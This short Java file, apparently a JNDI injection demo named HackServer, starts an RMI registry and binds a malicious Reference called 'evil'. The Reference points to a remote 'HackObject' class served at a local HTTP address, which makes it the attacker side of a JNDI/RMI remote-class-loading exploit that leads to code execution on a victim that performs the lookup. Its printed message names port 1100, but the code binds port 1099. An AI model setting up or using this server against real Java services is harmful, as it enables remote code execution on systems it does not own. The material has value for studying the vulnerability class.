package JNDI.HackDemo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class HackServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry= LocateRegistry.createRegistry(1099);
        String url = "http://127.0.0.1:7777/";
        System.out.println("Create RMI registry on port 1100");
        Reference reference=new Reference("HackObject","HackObject",url);
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        registry.bind("evil",referenceWrapper);
    }
}
